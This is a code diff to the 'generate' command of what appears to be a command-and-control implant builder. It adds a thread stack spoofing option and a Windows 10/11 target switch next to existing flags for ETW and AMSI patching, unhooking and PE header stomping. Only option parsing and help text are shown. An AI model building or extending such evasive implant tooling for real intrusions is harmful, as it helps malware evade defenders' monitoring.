@@ -34,7 +34,9 @@ def cmd_generate(args_str: str, project_root: Path, listeners: list) -> None:
         "no_etw": False,
         "no_amsi": False,
         "no_pe_stomp": False,
+        "no_stack_spoofing": False,
         "no_crypt": False,
+        "target_os": "win10",
         "debug": False,
     }
 
@@ -46,6 +48,7 @@ def cmd_generate(args_str: str, project_root: Path, listeners: list) -> None:
         "--no-etw": "no_etw",
         "--no-amsi": "no_amsi",
         "--no-pe-stomp": "no_pe_stomp",
+        "--no-stack-spoofing": "no_stack_spoofing",
         "--no-crypt": "no_crypt",
         "--debug": "debug",
     }
@@ -66,6 +69,12 @@ def cmd_generate(args_str: str, project_root: Path, listeners: list) -> None:
             m = parts[i + 1]
             opts["magic"] = int(m, 16) if m.startswith("0x") else int(m)
             i += 2
+        elif parts[i] == "--target-os" and i + 1 < len(parts):
+            val = parts[i + 1]
+            if val not in ("win10", "win11"):
+                console.print(f"[red]--target-os must be win10 or win11, got: {val}[/red]")
+                return
+            opts["target_os"] = val; i += 2
         elif parts[i] in ("--output", "-o") and i + 1 < len(parts):
             opts["output"] = Path(parts[i + 1]); i += 2
         elif parts[i] in bool_flags:
@@ -128,10 +137,12 @@ def cmd_generate(args_str: str, project_root: Path, listeners: list) -> None:
 
     # Show evasion/debug flags
     active_flags = [k for k in ("debug", "no_evasion", "no_sandbox", "no_unhook",
-                                 "no_etw", "no_amsi", "no_pe_stomp", "no_crypt")
+                                 "no_etw", "no_amsi", "no_pe_stomp", "no_stack_spoofing",
+                                 "no_crypt")
                     if opts[k]]
     if active_flags:
         console.print(f"  Flags:     {', '.join('--' + f.replace('_', '-') for f in active_flags)}")
+    console.print(f"  Target OS: {opts['target_os']}")
     console.print()
 
     try:
@@ -152,6 +163,8 @@ def cmd_generate(args_str: str, project_root: Path, listeners: list) -> None:
             no_etw=opts["no_etw"],
             no_amsi=opts["no_amsi"],
             no_pe_stomp=opts["no_pe_stomp"],
+            no_stack_spoof=opts["no_stack_spoofing"],
+            target_os=opts["target_os"],
             debug=opts["debug"],
             no_crypt=opts["no_crypt"],
         )
@@ -186,10 +199,15 @@ def _print_help():
   --no-etw              Disable ETW patching only
   --no-amsi             Disable AMSI patching only
   --no-pe-stomp         Disable PE header stomping only
+  --no-stack-spoofing   Disable thread stack spoofing (even on win11)
+  --target-os OS        Target OS: win10 or win11 (default: win10)
+                        Stack spoofing only enabled on win11
 
 [bold]Examples:[/bold]
   generate
   generate --url https://cdn.example.com/api/v1 --sleep 30
   generate --debug --no-unhook --no-sandbox --no-pe-stomp --no-crypt
   generate --arch x86 --kill-date 2026-12-31
+  generate --target-os win11
+  generate --target-os win11 --no-stack-spoofing
 """)
